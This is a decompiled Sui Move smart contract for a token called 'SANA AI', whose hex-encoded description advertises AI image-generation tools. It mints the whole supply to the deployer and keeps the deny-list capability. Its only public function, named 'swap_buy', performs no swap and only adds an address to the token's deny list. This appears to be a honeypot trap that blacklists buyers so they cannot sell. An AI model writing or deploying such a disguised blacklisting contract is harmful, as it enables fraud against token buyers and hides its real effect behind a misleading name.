module 0x64595702624e2c43d7dc711aedadd4da8b0e14b0409dd569da419d72a90e60ac::sanaai {
    struct SANAAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SANAAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SANAAI>(arg0, 9, b"SANAAI", b"SANA AI", x"556e6c6f636b2074686520706f776572206f6620414920616e6420657870657269656e6365206c696d69746c657373206372656174697669747920776974682053616e614e7669646961e2809973206e6578742d67656e20696d6167652067656e65726174696f6e20746f6f6c732e4275696c74206f6e2063757474696e672d6564676520746563686e6f6c6f67792c206f757220706c6174666f726d20656d706f7765727320757365727320746f206372656174652076697375616c6c79207374756e6e696e672067726170686963732c206172742c20616e6420636f6e74656e74e280946e6f2064657369676e20657870657269656e63652072657175697265642e556e6c656173682074686520706f74656e7469616c206f662041492d64726976656e2076697375616c7320696e207365636f6e64732c207769746820707265636973696f6e20616e6420636f6e74726f6c206f7665722065766572792064657461696c2e", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmXcisCd33Sm4hT97JBNnm3bhijUzHTfmdEC7tLWmYUhLa"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SANAAI>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SANAAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SANAAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SANAAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SANAAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SANAAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

